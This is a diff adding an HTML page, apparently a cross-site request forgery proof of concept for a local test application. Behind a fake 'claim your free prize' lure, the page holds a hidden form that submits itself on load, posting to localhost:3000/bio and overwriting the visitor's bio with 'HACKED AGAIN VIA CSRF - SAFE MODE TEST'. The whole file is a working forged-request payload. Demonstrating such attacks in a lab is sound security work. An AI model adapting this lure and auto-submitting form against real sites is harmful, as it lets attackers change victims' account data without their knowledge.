@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head><title>Totally Harmless Page</title></head>
+<body>
+  <h1>Congratulations! Click below to claim your free prize 🎉</h1>
+
+  <!-- This form auto-submits the instant the page loads -->
+  <form id="csrfForm" action="http://localhost:3000/bio" method="POST">
+    <input type="hidden" name="bio" value="HACKED AGAIN VIA CSRF - SAFE MODE TEST">
+  </form>
+
+  <script>
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>
